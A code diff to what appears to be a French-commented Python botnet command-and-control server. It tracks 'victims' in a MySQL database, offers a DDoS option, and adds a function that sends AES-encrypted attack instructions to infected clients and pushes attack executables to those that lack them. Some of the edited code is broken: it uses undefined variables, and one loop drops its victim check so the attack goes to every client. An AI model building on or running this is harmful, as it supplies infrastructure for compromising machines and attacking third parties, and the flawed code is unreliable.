@@ -1,4 +1,5 @@
 import argparse
+import os
 import mysql.connector
 import json
 import socket
@@ -96,6 +97,61 @@ db = mysql.connector.connect(
     database=DB
 )
 mycursor = db.cursor()
+
+def execute_attack(client, data):
+    print("sending attack to " + str(client['addr']))
+
+     # Récupération des données de l'attaque
+    attack_data = json.loads(attack[4])
+    attack_type = attack[2]
+    attack_id = attack[0]
+
+    data_to_send = format_attack_data(attack_type, attack_id, attack_data)
+
+    # Envoi de l'attaque à l'ordinateur
+    cipher_enc = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
+    cipher_text = cipher_enc.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
+
+    client['emission_queue'].put(cipher_text)
+    print("Instruction envoyée")
+
+    # reception du message retourner par le client 
+    try :
+        cipher_dec = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
+        encrypted_data_received = client['reception_queue'].get(timeout=10)
+        pt = unpad(cipher_dec.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')
+
+        if pt == "YES":
+            # le client à l'exécutable
+            print("Le client à déja l'exécutable")
+        else:
+            # envoyer l'exécutable 
+            print("Le client n'a pas l'exécutable")
+            attack_type = attack[2]
+            # Récupérer os du client 
+            # if os == "Windows":
+            #     executable_path = 'actions/windows/' + attack_type + '.exe'
+            # else:
+            executable_path = 'actions/linux/' + attack_type + '.sh'
+
+            if os.path.isfile(executable_path):
+                with open(executable_path, 'rb') as f:
+                    executable_data = f.read()
+                    cipher_text = cipher_enc.encrypt(pad(executable_data, AES.block_size))
+                    client['emission_queue'].put(cipher_text)
+                    print("L'exécutable a été envoyé")
+            else:
+                print("L'exécutable n'a pas été trouvé sur le serveur")
+    except Empty:
+        print("Le client n'a pas répondu")
+        pass
+
+    
+    # Recevoir le status final de l'envoi de l'exécutable
+    # encrypted_final_status = client['reception_queue'].get()
+    # final_status = unpad(cipher.decrypt(encrypted_final_status), AES.block_size).decode('utf-8')
+    # print(f"Statu final de l'attaque sur le client {client['addr']}: {final_status}")
+
 
 if args.ddos:
     if not args.address or not args.time:
@@ -779,6 +835,8 @@ elif args.start:
                 attack_type = attack[2]
                 attack_id = attack[0]
 
+                print("attack_data : " + str(attack_type))
+
 
                 # Récupération des ordinateurs du groupe
                 query = "SELECT uid FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = %s)"
@@ -793,21 +851,22 @@ elif args.start:
                 for victim_uid in victims_uid:
                     for client in clients:
                         if client['uid'] == victim_uid[0]:
-                            print("sending attack to " + str(client['addr']))
-                            attack_sent = True
+                            # print("sending attack to " + str(client['addr']))
+                            # attack_sent = True
 
-                            data_to_send = format_attack_data(attack_type, attack_id, attack_data)
+                            # data_to_send = format_attack_data(attack_type, attack_id, attack_data)
 
-                            # Envoi de l'attaque à l'ordinateur
-                            cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-                            cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
-                            print("cipher_text : ")
-                            print(cipher_text)
+                            # # Envoi de l'attaque à l'ordinateur
+                            # cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
+                            # cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
+                            # print("cipher_text : ")
+                            # print(cipher_text)
                             
-                            decimal_elements = [byte for byte in cipher_text]
-                            print("decimal_elements : " + str(decimal_elements))
+                            # decimal_elements = [byte for byte in cipher_text]
+                            # print("decimal_elements : " + str(decimal_elements))
 
-                            client['emission_queue'].put(cipher_text)
+                            # client['emission_queue'].put(cipher_text)
+                            execute_attack(client, attack_data)
 
                 # Mise à jour de l'attaque si elle a été envoyée au moins une fois
                 if attack_sent:
@@ -816,8 +875,8 @@ elif args.start:
 
                     mycursor.execute(query, values)
         
-
-
+            
+        
             # Récupération des attaques individuelles à lancer
             # state = "pending", "running", "finished", "error"
             query = "SELECT * FROM victim_attacks WHERE state = 'pending';"
@@ -830,8 +889,7 @@ elif args.start:
 
                 # Récupération des données de l'attaque
                 data = json.loads(attack[4])
-
-
+                
                 # Récupération des ordinateurs du groupe
                 query = "SELECT uid FROM victims WHERE id = %s"
                 values = (attack[1], )
@@ -845,16 +903,17 @@ elif args.start:
                     victim_uid = victim[0]
 
                     for client in clients:
-                        if client['uid'] == victim_uid:
-                            print("sending attack to " + str(client['addr']))
+                        # if client['uid'] == victim_uid:
+                        #     print("sending attack to " + str(client['addr']))
 
-                            data_to_send = format_attack_data(data)
+                        #     data_to_send = format_attack_data(data)
 
-                            # Envoi de l'attaque à l'ordinateur
-                            cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-                            cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
+                        #     # Envoi de l'attaque à l'ordinateur
+                        #     cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
+                        #     cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
 
-                            client['emission_queue'].put(cipher_text)
+                        #     client['emission_queue'].put(cipher_text)
+                        execute_attack(client, data)
 
                 # Mise à jour de l'attaque
                 query = "UPDATE victim_attacks SET state = 'running' WHERE id = %s"
